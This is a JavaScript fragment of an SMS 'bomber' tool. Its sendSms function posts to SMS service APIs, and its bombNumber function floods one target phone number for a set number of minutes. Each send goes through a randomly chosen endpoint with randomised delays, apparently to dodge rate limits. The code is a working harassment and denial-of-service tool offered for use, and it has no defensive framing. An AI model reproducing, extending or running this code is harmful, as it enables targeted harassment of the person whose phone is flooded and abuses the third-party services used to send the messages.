// Bombing Logic
// ------------------------------------

async function sendSms(api, number) {
  try {
    const response = await axios.post(api.url, api.payload(number), {
      headers: api.headers || { 'Content-Type': 'application/json' },
      timeout: 5000,
      validateStatus: false
    });
    
    return {
      success: response.status === 200 || response.status === 201,
      status: response.status,
      api: api.name
    };
  } catch (error) {
    return {
      success: false,
      error: error.message,
      api: api.name
    };
  }
}

async function bombNumber(number, durationMinutes = 5) {
  const startTime = Date.now();
  const endTime = startTime + (durationMinutes * 60 * 1000);
  let attempts = 0;
  let successes = 0;
  let errors = 0;

  console.log(`🔥 Starting bomb on ${number} for ${durationMinutes} minutes`);

  while (Date.now() < endTime) {
    attempts++;
    const randomApi = SMS_APIS[Math.floor(Math.random() * SMS_APIS.length)];
    
    const result = await sendSms(randomApi, number);
    if (result.success) {
      successes++;
      console.log(`✅ ${result.api} success (${attempts})`);
    } else {
      errors++;
      console.log(`❌ ${result.api} failed (${attempts})`);
    }

    // Random delay between 500-2000ms
    await new Promise(resolve => setTimeout(resolve, Math.random() * 1500 + 500));
  }

  console.log(`📊 Done: ${successes} successes, ${errors} errors`);
  return { successes, errors, attempts };
}
